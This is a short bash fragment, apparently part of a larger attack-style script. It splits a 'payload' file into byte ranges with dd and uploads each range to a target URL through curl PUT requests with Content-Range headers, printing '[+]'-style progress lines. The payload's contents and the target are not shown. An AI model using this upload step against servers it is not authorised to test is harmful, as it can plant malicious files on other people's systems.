FILE_SIZE=$(wc -c < "$PAYLOAD_FILE")
OFFSET=0

echo "[+] Uploading payload to $TARGET_URL in chunks of $CHUNK_SIZE bytes..."

while [ $OFFSET -lt $FILE_SIZE ]; do
  END=$((OFFSET + CHUNK_SIZE - 1))
  if [ $END -ge $FILE_SIZE ]; then END=$((FILE_SIZE - 1)); fi
  BYTES=$((END - OFFSET + 1))

  dd if="$PAYLOAD_FILE" bs=1 skip=$OFFSET count=$BYTES 2>/dev/null | \
    curl -s -X PUT \
      -H "Content-Range: bytes $OFFSET-$END/$FILE_SIZE" \
      --data-binary @- "$TARGET_URL"

  echo "  - Sent bytes $OFFSET to $END"
  OFFSET=$((END + 1))
done